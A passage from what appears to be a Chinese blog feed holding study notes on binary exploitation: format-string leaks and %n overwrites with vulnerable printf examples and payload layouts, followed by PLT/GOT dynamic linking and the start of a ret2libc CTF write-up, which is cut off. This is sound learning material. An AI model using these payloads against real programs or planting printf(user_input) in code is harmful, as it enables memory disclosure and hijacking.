class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000119d &lt;main&gt;:</span><br><span class=\"line\">    119d:       8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class=\"line\">    11a1:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class=\"line\">    11a4:       ff 71 fc                push   -0x4(%ecx)</span><br><span class=\"line\">    11a7:       55                      push   %ebp</span><br><span class=\"line\">    11a8:       89 e5                   mov    %esp,%ebp</span><br><span class=\"line\">    11aa:       53                      push   %ebx</span><br><span class=\"line\">    11ab:       51                      push   %ecx</span><br><span class=\"line\">    11ac:       e8 2b 00 00 00          call   11dc &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class=\"line\">    11b1:       05 27 2e 00 00          add    $0x2e27,%eax</span><br><span class=\"line\">    11b6:       6a 03                   push   $0x3      &lt;-------------------------------</span><br><span class=\"line\">    11b8:       6a 02                   push   $0x2      &lt;-------------------------------</span><br><span class=\"line\">    11ba:       6a 01                   push   $0x1      &lt;-------------------------------</span><br><span class=\"line\">    11bc:       8d 90 30 e0 ff ff       lea    -0x1fd0(%eax),%edx</span><br><span class=\"line\">    11c2:       52                      push   %edx</span><br><span class=\"line\">    11c3:       89 c3                   mov    %eax,%ebx</span><br><span class=\"line\">    11c5:       e8 86 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class=\"line\">    11ca:       83 c4 10                add    $0x10,%esp</span><br><span class=\"line\">    11cd:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class=\"line\">    11d2:       8d 65 f8                lea    -0x8(%ebp),%esp</span><br><span class=\"line\">    11d5:       59                      pop    %ecx</span><br><span class=\"line\">    11d6:       5b                      pop    %ebx</span><br><span class=\"line\">    11d7:       5d                      pop    %ebp</span><br><span class=\"line\">    11d8:       8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class=\"line\">    11db:       c3                      ret</span><br></pre></td></tr></table></figure>\n<p>​\t能够发现在我指的那三行，在调用 printf 函数之前是先将参数从右向左压入栈中，之后通过读取栈的参数与格式化字符串一起打印出来。</p>\n<h2 id=\"格式化字符串漏洞\"><a class=\"markdownIt-Anchor\" href=\"#格式化字符串漏洞\">#</a> 格式化字符串漏洞：</h2>\n<p>​\t有了前面的那些储备知识，这个时候就可以来看看格式化字符串的漏洞了。</p>\n<h3 id=\"初探\"><a class=\"markdownIt-Anchor\" href=\"#初探\">#</a> 初探：</h3>\n<p>​\t首先，写一个程序，如下内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x  %x  %x  %x  \\n&quot;</span>,<span class=\"number\">0x1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t那么，直接进行动态调试，观看<strong> main</strong> 的栈帧中相关的信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00:0000│ esp 0xffffd500 —▸ 0x56557008 ◂— &#x27;%x  %x  %x  %x  \\n&#x27;</span><br><span class=\"line\">01:0004│-014 0xffffd504 ◂— 0x1                                            &lt;--------------------</span><br><span class=\"line\">02:0008│-010 0xffffd508 —▸ 0xf7fbeb20 —▸ 0xf7c1acc6 ◂— &#x27;GLIBC_PRIVATE&#x27;    &lt;--------------------</span><br><span class=\"line\">03:000c│-00c 0xffffd50c —▸ 0x565561b1 (main+20) ◂— add eax, 0x2e27        &lt;--------------------</span><br><span class=\"line\">04:0010│-008 0xffffd510 —▸ 0xffffd530 ◂— 0x1        \t\t\t\t\t  &lt;--------------------</span><br><span class=\"line\">05:0014│-004 0xffffd514 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class=\"line\">06:0018│ ebp 0xffffd518 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— 0x464c457f</span><br></pre></td></tr></table></figure>\n<p>​\t然后，运行到 printf 函数之后，再看看输出的值是多少：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">n</span></span><br><span class=\"line\">1  f7fbeb20  565561b1  ffffd530</span><br></pre></td></tr></table></figure>\n<p>​\t发现输出的值和箭头指出来的值一样。因此，黑客则可以利用此漏洞配合 **% n$d** 来进行内存的读取了。</p>\n<p>​</p>\n<h3 id=\"一次简单的漏洞的实例\"><a class=\"markdownIt-Anchor\" href=\"#一次简单的漏洞的实例\">#</a> 一次简单的漏洞的实例：</h3>\n<p>​\t实际上，格式化字符串的漏洞很多时候都是由于程序员们偷懒，才会导致一些漏洞的产生，比如下面的程序，如果写成这个样子：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> str[<span class=\"number\">100</span>];</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,str);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,str);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t如果是这样的话，程序运行就不会出现太大的问题，但是，当程序员偷懒，使用下面的写法，就会出现问题：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> str[<span class=\"number\">100</span>];</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>,str);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(str);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t运行的话就会出现如下的结果：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class=\"line\">aaa.%x</span><br><span class=\"line\">aaa.fff53a28</span><br></pre></td></tr></table></figure>\n<p>​\t根据 gdb 调试，就会发现，它输出了比 esp 地址高 4 字节的那一地址的数据。</p>\n<h3 id=\"泄露内存\"><a class=\"markdownIt-Anchor\" href=\"#泄露内存\">#</a> 泄露内存：</h3>\n<p>​\t还是刚才那个程序，其实可以在这个时候多输入几个 % x 来进行父函数栈帧的 esp 高 4 字节的地址开始的多个字节的内存，或者通过 n$ 来进行任意内存的读取：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa.fff53a28root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\">x.%x.%x.%x.%x.%x.%x</span></span><br><span class=\"line\">ff8631d8.0.565a31d4.0.0.252e7825.78252e78</span><br><span class=\"line\"></span><br><span class=\"line\">root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\">3<span class=\"variable\">$x</span></span></span><br><span class=\"line\">565cf1d4</span><br></pre></td></tr></table></figure>\n<h3 id=\"泄露任意地址的内存\"><a class=\"markdownIt-Anchor\" href=\"#泄露任意地址的内存\">#</a> 泄露任意地址的内存：</h3>\n<p>​\t上一个方法只是泄露了栈上的数据，其实，格式化字符串可以对任意内存地址的数据进行泄露。、</p>\n<p>​\t攻击者可以使用类似于 &quot;% s&quot; 的格式规范做到泄露栈中存放的值对应的地址的字符串的内容，这里引用下 dalao 的对于 % s 的讲解：</p>\n<blockquote>\n<p><strong>程序会将 % s 指向的地址作为一个 ASCII 字符串处理，直到遇到一个空字符。所以，如果攻击者能够操纵这个参数的值，那就可以泄露任意地址的内容。</strong></p>\n<p>或者说</p>\n<p><strong>% s 是把地址指向的内存内容给打印出来，可以把 函数的地址给打印出来。</strong></p>\n</blockquote>\n<p>​\t也就是说，想要做到任意地址的内存泄露，就需要想办法对栈上的某个地址的值进行修改为想要获得的那个字符串的地址。</p>\n<h3 id=\"覆盖栈内存\"><a class=\"markdownIt-Anchor\" href=\"#覆盖栈内存\">#</a> 覆盖栈内存：</h3>\n<p>​\t% n 不能够输出字符，但是，它能把已经成功输出的字符个数写入<strong>对应的整形指针参数所致的变量</strong>，只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值。</p>\n<blockquote>\n<p>一般来说，这种方法利用的步骤为：</p>\n<ul>\n<li>确定覆盖地址</li>\n<li>确定相对位移</li>\n<li>进行覆盖</li>\n</ul>\n</blockquote>\n<p>​\t<strong>注：以下为我个人的见解，如有问题，请指正。</strong></p>\n<p>​\t首先，之前说过了 % n 这个格式化字符串的作用是啥：</p>\n<blockquote>\n<p><strong>% n, 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</strong></p>\n</blockquote>\n<p>​\t之后，用一个程序作为示例：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> a = <span class=\"number\">123</span>, b = <span class=\"number\">456</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> c = <span class=\"number\">789</span>;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>, &amp;c);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, s);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(s);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (c == <span class=\"number\">16</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;modified c.&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;modified a for a small number.&quot;</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (b == <span class=\"number\">0x12345678</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;modified b for a big number!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t这个程序的格式化字符串漏洞的函数很容易就能找到，那就是 printf (s)，因此，假设对变量 c 进行修改，就需要用到 % n 对 C 进行修改，所以，格式如下：</p>\n<blockquote>\n<p>c 的地址 + 12 个任意的字符 + 对应格式化字符串的参数的偏移</p>\n</blockquote>\n<p>​\t好了，实际试试看吧：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AAAA,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$p</span>,<span class=\"variable\">$proot</span>@g01den-virtual-machine:/home/g01den/Temp<span class=\"comment\"># ./a</span></span><br><span class=\"line\">0xff8d3ad4</span><br><span class=\"line\">AAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class=\"line\">AAA,0xff8d3ad8,(nil),0x565d51e4,(nil),0x315,0x2c414141,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70</span><br></pre></td></tr></table></figure>\n<p>​\t由此可知，传入的格式化字符串 AAA，所对应的参数是第六位，因此，对应格式化字符串对应的偏移为 6，也就是说，值为 %6$n，好的，之后就是 c 的地址，<strong>我在学到这里的时候出现了理解不能的问题，最后大致是整明白了，就是不知道对不对。</strong></p>\n<p>​\t对于 C 的地址，我认为是，正是因为构造的格式化字符串的前四个字节是 c 的地址，因此，% n 这个格式化字符串在写的时候对应的就是第六个参数，而第六个参数的前四个字节就是 c 的地址，因此就成功修改了 c 这个变量的值；** 那么问题就来了，为啥不能直接指定第五个参数进行修改呢？** 我个人的理解是这样的：<strong>因为第五个参数存放的并不是 c 这个变量的地址，是 789，因此，% n 就试图把 16 写入 789 这个地址里去，但是，这个地址要么不存在，要么就是无法访问，则会出现 segment fault，导致程序出现了错误。</strong></p>\n<h3 id=\"覆盖小数字\"><a class=\"markdownIt-Anchor\" href=\"#覆盖小数字\">#</a> 覆盖小数字：</h3>\n<p>​\t那么，问题又出现了，因为如果让变量的地址作为开始的字符，就会导致 % n 写入的最小的值也是 4，那么，如果要让某个变量被覆盖为 2，又该怎么做呢？</p>\n<p>​\t<strong>注：以下对于内容的解释部分均为我自己的理解，如有错误，还请指正。</strong></p>\n<p>​\t照理来说，想要某个变量被覆盖为 2 的话，就需要诸如</p>\n<blockquote>\n<p>aa% k$naa + 地址</p>\n</blockquote>\n<p>​\t这样的字符串，所以是为啥呢？</p>\n<p>​\t这里借用 julao 们的说法是</p>\n<blockquote>\n<p><strong>aa%k<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mi>x</mi><mi>x</mi><mtext>，如果用这样的方式，前面</mtext><mi>a</mi><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">nxx，如果用这样的方式，前面 aa%k 是第六个参数，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">样</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">前</span><span class=\"mord cjk_fallback\">面</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">a</span></span></span></span>nxx 是第七个参数，后面在跟一个 我们想要修改的地址，那么这个地址就是第八个参数，只需要把 k 改成 8 就可以把这第八个参数改成 2，aa%8$nxx</strong></p>\n</blockquote>\n<p>​\t我个人的理解为，在栈中，每个字符的长度为 1 字节，另外，对于格式化字符串的参数传递而言，每个参数都占用了四个字节（32 位），所以，这里需要前和中都构成四个字节的字符串，因此，第六位的字符串就是 aa% k，第七位就是 $naa，第八位就可以传入变量的地址了。</p>\n<p><strong>后续的内容需要花费一些时间，短时间内先放放，暂时放下不管，之后有时间再来补充。</strong></p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/52965aaa.html",
            "url": "http://blog.g01den.top/posts/52965aaa.html",
            "title": "pwn学习笔记（4）ret2libc",
            "date_published": "2024-02-19T10:10:34.000Z",
            "content_html": "<h1 id=\"pwn学习笔记4\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记4\">#</a> pwn 学习笔记（4）</h1>\n<h2 id=\"静态链接\"><a class=\"markdownIt-Anchor\" href=\"#静态链接\">#</a> 静态链接：</h2>\n<p>​\t静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。这里的库指的是静态链接库，Windows 下以.lib 为后缀，Linux 下以.a 为后缀。</p>\n<p>​\t也就是说将静态链接库中的所有的函数都写入这个 ELF 文件中，所以会造成该二进制文件极为庞大，因此也会存在很多的可供利用来 ret2syscall 的 gadgets。但是，使用静态链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费。</p>\n<p>​\t对于 ret2syscall 而言，我们能够在程序中找到众多的可以给我们利用的 gadgets，主要是因为二进制程序是静态链接程序，正因为如此，存在众多的 gadgets，给我们构造系统调用。</p>\n<h2 id=\"动态链接\"><a class=\"markdownIt-Anchor\" href=\"#动态链接\">#</a> 动态链接：</h2>\n<h3 id=\"1简述\"><a class=\"markdownIt-Anchor\" href=\"#1简述\">#</a> 1. 简述：</h3>\n<p>​\t动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows 下以.dll 为后缀，Linux 下以.so 为后缀。</p>\n<p>​\t动态链接可以大规模减小 ELF 文件的大小，几乎动态链接库中的文件不用直接写入 ELF 文件中，因此，ELF 文件中就缺少足够的 gadgets 可供构造出系统调用。</p>\n<p>​\t对于动态链接的程序而言，如果遇到一个需要的存在于动态链接库中的函数，例如：puts ()，system ()，printf () 等等，这个时候，因为这些程序并没有写入 ELF 文件中，因此，这是就需要从栈和堆之间的 shared libraries 段去查找相关的函数的代码以及一些全局变量，例如：&quot;/bin/sh&quot;。</p>\n<p>​\t那么，动态链接应该如何进行呢？</p>\n<p>​\t在正式讲述这个过程之前，首先需要知道两个东西：</p>\n<p>​\t1、用来存放外部函数地址的数据段：<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table）</p>\n<p>​\t2、用来获取数据段记录的外部函数地址的代码：<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>\n<p>​\t3、为了安全起见，shared libraries 段所存放的动态链接的函数的代码的基地址是随机的，但是每个函数相对于基地址的偏移量是相同的。</p>\n<p>​\t4. 延迟绑定：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>\n<p>​\t对于 plt 表和 got 表的简述：</p>\n<p>​\tplt 表存放了一部分的代码，用于跳转到 got 表中被调用函数相对应的地址。</p>\n<p>​\tgot 表存放了在 shared libraries 段中的相对的代码的正确的地址。</p>\n<h3 id=\"2过程\"><a class=\"markdownIt-Anchor\" href=\"#2过程\">#</a> 2. 过程：</h3>\n<h4 id=\"第一次调用以printf举例\"><a class=\"markdownIt-Anchor\" href=\"#第一次调用以printf举例\">#</a> 第一次调用（以 printf () 举例）：</h4>\n<p>​\t首先展示一下相关的代码:</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/19d425d75963463a98ab32e69a30ebc2.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t首先是在 text 段中执行了 call puts@plt，这个时候，程序执行流来到了 plt 段中的 puts 函数相关的代码，也就是 jmp *(puts@got)，再之后，程序执行流跳转到了.got.plt 段中的相关的地址，但是，因为进程是第一次调用的 puts 函数，因此，got 表中，puts 函数对应的地址为 puts@plt+1，因此回到了额 push index，回到 plt 表的目的是为了解析 puts 函数的实际地址，然后执行 jmp PLT0 ，跳转到 plt 头部，为 dl_runtime_resolve 函数传参，之后执行 PLT0 的两个结束后，也就是完成了传参后，dl_runtime_resolve 函数就会开始解析 puts 函数真正的地址，并填入 got.plt 表中，之后，got.plt 中保存的就是 puts 函数真正的地址，之后返回到 text 段的 call puts@plt 重新调用 puts 函数，跳转到 plt 表的 jmp *(puts@got) 代码，之后跳转到 got.plt 表，因为 got.plt 存放的就是 puts 函数的真实地址，所以，程序执行流就会调转到 puts 函数的真实地址以调用该函数。</p>\n<h4 id=\"第二次调用\"><a class=\"markdownIt-Anchor\" href=\"#第二次调用\">#</a> 第二次调用：</h4>\n<p>​\t程序执行流在 text 段执行了 call puts@plt，之后跳转到 plt 执行 jmp *(puts@got)，随后直接跳转到 got.plt 表中，紧接着跳转到 puts 函数所在的动态链接库中的真实地址。</p>\n<h2 id=\"浅谈函数调用中的参数传递\"><a class=\"markdownIt-Anchor\" href=\"#浅谈函数调用中的参数传递\">#</a> 浅谈函数调用中的参数传递：</h2>\n<p>​\t某些情况，例如以如下程序为例：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   \tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t但程序执行到 system 函数的时候，原本此时的栈的当前位置为:</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/02806003ea09499a905c8add6b087050.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t也就是说，程序还没有执行到 call system 时（假设此时是以静态链接的 ELF 文件），栈的栈顶是如上图所示，但是，当 call system 代码执行时，将会将 ip 寄存器的值向下移一位的值压入栈中，然后跳转到 system 函数的第一行也就是 push bp，经过这两个操作后，栈的情况会如下图所示，对了，arg1 因为调用的是 system (&quot;/bin/sh&quot;) 的原因，arg1 存储的值会是 &quot;/bin/sh&quot; 的地址，如下图所示：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/5536f6e0104141ba84590bfafd442129.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t因此，传参的时候，system 想要获取到 &quot;/bin/sh&quot; 的地址，就需要跳过 bp、return_addr 这两个字长，才能够获取到参数 &quot;/bin/sh&quot; 的地址。</p>\n<h2 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc：</h2>\n<h3 id=\"1情况1\"><a class=\"markdownIt-Anchor\" href=\"#1情况1\">#</a> 1. 情况 1：</h3>\n<h4 id=\"题目案例ctf-wikiret2libc1\"><a class=\"markdownIt-Anchor\" href=\"#题目案例ctf-wikiret2libc1\">#</a> 题目案例：CTF-Wiki–ret2libc1：</h4>\n<p>​\t拿到题目之后，先检查检查这个题目的保护以及架构：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"comment\"># checksec ret2libc1 </span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>​\t老样子，还是只开启了 NX 保护，32 位小端序，之后通过 IDA 反编译：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">100</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  retur</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t发现危险函数 gets ()，之后从函数窗口中查到了 secure 函数，怀疑该函数时一个后门函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">secure</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> input; <span class=\"comment\">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> secretcode; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v0 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v0);</span><br><span class=\"line\">  secretcode = rand();</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;input);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( input == secretcode )</span><br><span class=\"line\">    system(<span class=\"string\">&quot;shell!?&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t但是，system () 函数的参数确实 &quot;shell!?&quot;，很明显，这个并不是一个正确的调用 shell 的一个方式。不过这里却给予了我们另一条路，因为开启了 NX 保护，所以无法使用 ret2shellcode 的方式来完成这个题目，因为是动态链接的题目，所以考虑 ret2syscall 的做法也不切合实际。那么，这里或许应该考虑别的方法了，也就是 ret2libc，因为这里尝试调用了 system () 函数，因此或许存在 system 的 plt 